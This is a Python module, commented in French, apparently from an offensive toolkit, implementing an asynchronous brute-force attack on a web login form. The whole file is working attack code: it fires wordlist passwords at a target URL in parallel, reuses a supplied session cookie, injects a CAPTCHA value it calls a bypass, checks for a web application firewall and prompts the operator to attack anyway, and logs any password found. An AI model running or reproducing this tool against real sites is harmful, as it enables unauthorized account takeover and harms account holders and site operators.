import asyncio
import aiohttp
import os 
from core.reporter import add_finding
from core.utils import resolve_wordlist
from core.waf import detect_waf

async def attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore, captcha_field="", captcha_val=""):
    """Effectue une tentative de connexion unique avec support CAPTCHA."""
    data = {
        user_field: username,
        pass_field: password
    }
    
    # Injection du CAPTCHA résolu manuellement si fourni
    if captcha_field and captcha_val:
        data[captcha_field] = captcha_val
    
    async with semaphore:
        try:
            # Correction Pylance : Utilisation d'un objet ClientTimeout
            timeout = aiohttp.ClientTimeout(total=5)
            async with session.post(url, data=data, timeout=timeout, allow_redirects=True) as resp:
                content = await resp.text()
                
                # Si le message d'échec n'est PAS dans la réponse, c'est peut-être un succès
                if fail_msg not in content:
                    print(f"\n[\033[92m+\033[0m] SUCCÈS : Mot de passe trouvé : \033[1m{password}\033[0m")
                    return password
        except Exception:
            pass
    return None

async def start_brute(url, username, wordlist_path, user_field, pass_field, fail_msg, threads, cookie_str="", captcha_field="", captcha_val=""):
    print(f"[*] Lancement du Brute Force sur {url} (Cible: {username})")
    
    # ==========================================
    # 1. PRÉPARATION DU BYPASS (SESSION / CAPTCHA)
    # ==========================================
    cookies = {}
    if cookie_str:
        print(f"[\033[94m*\033[0m] Session Fixation activée : {cookie_str}")
        if '=' in cookie_str:
            key, val = cookie_str.split('=', 1)
            cookies[key.strip()] = val.strip()

    if captcha_field and captcha_val:
        print(f"[\033[94m*\033[0m] Bypass CAPTCHA activé : Injection de [{captcha_field}={captcha_val}]")

    # ==========================================
    # 2. MODE CASCADE (AUTO-PILOT)
    # ==========================================
    wordlists_to_try = []
    if wordlist_path == "auto":
        print("[\033[94m*\033[0m] Mode Auto-Pilot activé : Lancement de la cascade.")
        if os.path.exists("custom_wordlist.txt"):
            wordlists_to_try.append("custom_wordlist.txt")
        wordlists_to_try.append("pass_top10k.txt")
    else:
        wordlists_to_try.append(wordlist_path)
    
    semaphore = asyncio.Semaphore(threads)
    
    # On passe le cookie de session persistant directement ici !
    async with aiohttp.ClientSession(cookies=cookies) as session:
        for wl_name in wordlists_to_try:
            real_path = resolve_wordlist(wl_name)
            if not real_path:
                continue
                
            print(f"\n[*] Attaque en cours avec l'arsenal : \033[1m{wl_name}\033[0m ...")
            tasks = []
            
            try:
                with open(real_path, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        password = line.strip()
                        if not password: continue
                        
                        # Ajout des champs captcha à la tâche
                        tasks.append(attempt_login(session, url, username, password, user_field, pass_field, fail_msg, semaphore, captcha_field, captcha_val))
                
                if not tasks:
                    continue

                # --- L'AMÉLIORATION ASYNCHRONE : EARLY EXIT ---
                for coro in asyncio.as_completed(tasks):
                    res = await coro
                    if res:
                        add_finding("Brute Force Web", url, f"Accès trouvé ! Utilisateur: **{username}** | Password: **{res}**")
                        return # Arrêt total ! On ne teste pas les autres dictionnaires.
                
                print(f"[-] Aucun mot de passe valide dans {wl_name}.")
                
            except Exception as e:
                print(f"[-] Erreur lors de la lecture de {wl_name} : {e}")

    # Si la boucle des dictionnaires se termine sans succès
    print("\n[-] Échec : Le compte a résisté à toutes nos listes d'attaque.")

def run_brute_custom(args):
    """Wrapper pour arsenal.py"""
    
    # ==========================================
    # PRE-FLIGHT CHECK : DÉTECTION DE WAF
    # ==========================================
    has_waf, reason = asyncio.run(detect_waf(args.url))
    if has_waf:
        print(f"\n[\033[93m!\033[0m] \033[1mATTENTION : WAF DÉTECTÉ SUR LA CIBLE !\033[0m")
        print(f"    -> Raison : {reason}")
        print("    -> Risque : Bannissement IP très probable en mode Brute-Force.")
        choix = input("[?] Voulez-vous engager la cible quand même ? (o/N) : ")
        if choix.lower() != 'o':
            print("[-] Tir annulé. Retour à la base.")
            return

    # ==========================================
    # LANCEMENT
    # ==========================================
    # Récupération défensive des nouveaux arguments optionnels
    cookie = getattr(args, 'cookie', '')
    c_field = getattr(args, 'captcha_field', '')
    c_val = getattr(args, 'captcha_val', '')

    try:
        asyncio.run(start_brute(
            args.url, args.user, args.wordlist, 
            args.user_field, args.pass_field, args.fail, args.threads,
            cookie, c_field, c_val
        ))
    except KeyboardInterrupt:
        print("\n[-] Brute-Force interrompu par l'utilisateur.")